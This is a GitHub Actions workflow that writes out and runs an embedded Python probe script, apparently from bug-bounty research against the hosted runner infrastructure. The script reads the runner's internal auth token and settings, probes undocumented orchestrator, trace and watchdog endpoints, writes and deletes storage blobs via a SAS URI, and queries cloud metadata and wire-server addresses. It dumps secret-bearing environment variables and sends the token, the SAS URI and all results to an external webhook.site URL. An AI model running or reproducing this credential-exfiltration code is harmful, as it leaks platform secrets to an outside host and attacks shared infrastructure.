name: Probe v45 - account_a
on:
  workflow_dispatch:
jobs:
  probe:
    runs-on: ubuntu-24.04
    env:
      V45_SOURCE: v45_account_a
    steps:
      - name: v45 binary path + trace deep probe
        run: |
          cat > /tmp/v45_probe.py << 'PROBE_EOF'
          
          import json, os, base64, subprocess, re, urllib.request, urllib.error, urllib.parse, time
          
          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
          SOURCE  = os.environ.get("V45_SOURCE", "v45_account_a")
          
          def probe(method, url, body=None, extra=None):
              data = body.encode() if isinstance(body, str) else (body or None)
              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
              if extra:
                  headers.update(extra)
              if data:
                  headers["Content-Length"] = str(len(data))
              req = urllib.request.Request(url, data=data, headers=headers, method=method)
              try:
                  r = urllib.request.urlopen(req, timeout=12)
                  return {"status": r.status, "body": r.read(4000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
              except urllib.error.HTTPError as e:
                  return {"status": e.code, "body": e.read(4000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
              except Exception as ex:
                  return {"status": 0, "body": str(ex), "hdrs": {}}
          
          def auth(method, url, token, body=None):
              return probe(method, url, body, {"Authorization": f"Bearer {token}"})
          
          print(f"[{SOURCE}] start")
          
          with open("/opt/hca/.settings") as f:
              s = json.load(f)
          
          token     = s.get("authToken", "")
          sched_url = s.get("schedulerApiUrl", "").rstrip("/")  # includes /v1
          trace_url = s.get("traceApiUrl", "").rstrip("/")
          watch_url = s.get("watchdogTraceApiUrl", "").rstrip("/")
          sas_uri   = s.get("diagnosticsSasUri", "")
          config_id = s.get("configId", "")
          quota_id  = s.get("quotaId", "")
          
          # Parse orchestrator host (without /v1)
          from urllib.parse import urlparse
          parsed_orch = urlparse(sched_url)
          orch_host = f"{parsed_orch.scheme}://{parsed_orch.netloc}"  # e.g. https://orchestrator.githubapp.com
          
          parts = token.split(".")
          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
          claims = json.loads(base64.urlsafe_b64decode(pad))
          wid = claims.get("wid", "")
          
          print(f"[{SOURCE}] sched_url={sched_url}")
          print(f"[{SOURCE}] orch_host={orch_host}")
          print(f"[{SOURCE}] wid={wid}")
          print(f"[{SOURCE}] config_id={config_id}")
          print(f"[{SOURCE}] all_settings_keys={list(s.keys())}")
          print(f"[{SOURCE}] all_settings={json.dumps(s, default=str)[:2000]}")
          
          results = {}
          
          # -- 1. All binary-discovered paths on schedulerApiUrl -----------------
          # Binary had /v1/X paths - strip /v1 and append to sched_url
          binary_subpaths = [
              "/annotation", "/conclusion", "/status", "/abuse_info",
              "/abuse_info_identity", "/target_repository", "/billing_plan_owner",
              "/callbacks", "/configuration", "/oidc_config", "/context",
              "/github_event_info", "/properties", "/tenant_info", "/rerun_context",
              "/run_service", "/abuseonworkersettings", "/actionsabuseinfo",
              "/actor", "/targetrepoowner", "/headrepoowner", "/billingplanowner",
              "/targetrepository", "/headrepository", "/networklog", "/store", "/vminfo",
          ]
          # Also try the v3/v4/v2 paths directly on the orchestrator host
          versioned_paths = [
              ("/v3/disk", orch_host),
              ("/v4/json", orch_host),
              ("/v2/rand", orch_host),
          ]
          
          print(f"\n[{SOURCE}] Binary path probe on schedulerApiUrl ({len(binary_subpaths)} paths)...")
          for sub in binary_subpaths:
              url = sched_url + sub
              for method in ["GET", "POST"]:
                  r = auth(method, url, token)
                  key = f"{method} {sub}"
                  results[key] = {"status": r["status"], "body": r["body"][:500]}
                  if r["status"] not in (404, 405):
                      print(f"[BIN] *** {method} {sub} -> {r['status']} | {r['body'][:200]}")
                  else:
                      print(f"[BIN] {method} {sub:36} -> {r['status']}")
          
          print(f"\n[{SOURCE}] Versioned path probe on orch_host...")
          for vpath, base in versioned_paths:
              url = base + vpath
              r = auth("GET", url, token)
              results[f"GET {vpath}"] = {"status": r["status"], "body": r["body"][:300]}
              print(f"[BIN] GET {vpath} -> {r['status']} | {r['body'][:100]}")
          
          # -- 2. TraceApiUrl deep probe -- all verbs on root ---------------------
          trace_results = {}
          if trace_url:
              print(f"\n[{SOURCE}] TraceApiUrl deep probe: {trace_url}")
              # GET / returned 405 -- endpoint exists, try all verbs
              for method in ["POST", "PUT", "PATCH", "DELETE", "GET", "HEAD", "OPTIONS"]:
                  r = auth(method, trace_url, token, "{}")
                  trace_results[f"{method} /"] = {"status": r["status"], "body": r["body"][:400]}
                  print(f"[TRACE] {method:8} / -> {r['status']} | {r['body'][:100]}")
              # Also try orch_host + /trace directly
              r = auth("POST", orch_host + "/trace", token, "{}")
              trace_results["POST /trace (host)"] = {"status": r["status"], "body": r["body"][:300]}
              print(f"[TRACE] POST (host)/trace -> {r['status']} | {r['body'][:100]}")
          
          # -- 3. Watchdog deep probe --------------------------------------------
          watch_results = {}
          if watch_url:
              print(f"\n[{SOURCE}] Watchdog deep probe: {watch_url}")
              for method in ["POST", "PUT", "GET", "OPTIONS"]:
                  r = auth(method, watch_url, token, "{}")
                  watch_results[f"{method} /"] = {"status": r["status"], "body": r["body"][:300]}
                  print(f"[WATCH] {method:8} / -> {r['status']} | {r['body'][:100]}")
          
          # -- 4. SAS: try alternate write operations -----------------------------
          sas_results = {}
          if sas_uri:
              from urllib.parse import urlparse as up
              p = up(sas_uri)
              q = p.query
              origin = f"{p.scheme}://{p.netloc}"
              path_parts = p.path.split("/")
              container_path = "/" + "/".join(path_parts[1:3]) if len(path_parts) >= 3 else p.path
          
              # Try writing an appendblob (different blob type)
              blob_dir = origin + container_path
              append_url = blob_dir + "/hackerone-v45-append.log?" + q
              r = probe("PUT", append_url, body="v45-probe-hackerone",
                        extra={"x-ms-blob-type": "AppendBlob", "Content-Type": "text/plain"})
              sas_results["put_appendblob"] = {"status": r["status"], "body": r["body"][:300]}
              print(f"\n[SAS] PUT AppendBlob -> {r['status']} | {r['body'][:100]}")
          
              # List blobs in container using specific SAS (different query param)
              list2_url = blob_dir + "?restype=container&comp=list&include=metadata&" + q
              r = probe("GET", list2_url)
              sas_results["list_with_metadata"] = {"status": r["status"], "body": r["body"][:1000]}
              print(f"[SAS] LIST+metadata -> {r['status']} | {r['body'][:200]}")
          
              # Try writing with DELETE verb
              del_url = blob_dir + "/hackerone-v44-overwrite.json?" + q
              r = probe("DELETE", del_url)
              sas_results["delete_blob"] = {"status": r["status"], "body": r["body"][:300]}
              print(f"[SAS] DELETE blob -> {r['status']} | {r['body'][:100]}")
          
          # -- 5. Wire server -- better approach ----------------------------------
          wire_results = {}
          print(f"\n[{SOURCE}] Wire server probe (direct curl without sudo)...")
          # Try without cert first
          wire_eps = ["/machine?comp=versions", "/machine?comp=goalstate"]
          for wep in wire_eps:
              try:
                  res = subprocess.run(
                      ["curl", "-s", "-w", "\n%{http_code}", "--max-time", "8",
                       f"http://168.63.129.16{wep}"],
                      capture_output=True, text=True, timeout=12
                  )
                  wire_results[wep + "_nocert"] = res.stdout[-1000:]
                  print(f"[WIRE] {wep} (no cert) -> {res.stdout[-200:]}")
              except Exception as ex:
                  print(f"[WIRE] error: {ex}")
          
          # Try with sudo (get exact error)
          try:
              res = subprocess.run(
                  ["sudo", "ls", "-la", "/var/lib/waagent/"], capture_output=True, text=True, timeout=5
              )
              wire_results["waagent_dir"] = res.stdout + res.stderr
              print(f"[WIRE] waagent dir: {res.stdout[:300]} err: {res.stderr[:100]}")
          except Exception as ex:
              print(f"[WIRE] waagent ls error: {ex}")
          
          # -- 6. Internal network scan -- identify unreachable services ----------
          print(f"\n[{SOURCE}] Internal endpoint discovery...")
          internal_endpoints = [
              "http://169.254.169.254/",
              "http://169.254.169.254/metadata",
              "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
              "http://168.63.129.16/",
          ]
          internal_results = {}
          for iurl in internal_endpoints:
              r = probe("GET", iurl, extra={"Metadata": "true"})
              internal_results[iurl] = {"status": r["status"], "body": r["body"][:500]}
              print(f"[INT] GET {iurl} -> {r['status']} | {r['body'][:150]}")
          
          # -- 7. Env var and context dump ---------------------------------------
          env_dump = {k: v for k, v in os.environ.items()
                      if any(x in k.upper() for x in
                             ['GITHUB', 'ACTIONS', 'RUNNER', 'TOKEN', 'SECRET', 'URL', 'HCA', 'AZURE'])}
          print(f"\n[{SOURCE}] Env vars: {json.dumps(env_dump, default=str)[:2000]}")
          
          # -- 8. POST to webhook ------------------------------------------------
          payload = {
              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
              "token": token, "sched_url": sched_url, "orch_host": orch_host,
              "trace_url": trace_url, "watch_url": watch_url, "sas_uri": sas_uri,
              "claims": claims, "config_id": config_id, "quota_id": quota_id,
              "settings": {k: v for k, v in s.items() if k != "authToken"},
              "binary_probe_results": results,
              "trace_results": trace_results,
              "watch_results": watch_results,
              "sas_results": sas_results,
              "wire_results": wire_results,
              "internal_results": internal_results,
              "env_dump": env_dump,
          }
          data = json.dumps(payload).encode()
          req = urllib.request.Request(WEBHOOK, data=data,
                                        headers={"Content-Type": "application/json"}, method="POST")
          try:
              r = urllib.request.urlopen(req, timeout=20)
              print(f"\n[{SOURCE}] Webhook: {r.status}")
          except Exception as ex:
              print(f"[{SOURCE}] Webhook error: {ex}")
          
          print(f"[{SOURCE}] DONE")
          PROBE_EOF
          python3 /tmp/v45_probe.py
      - name: Keep alive
        run: sleep 60
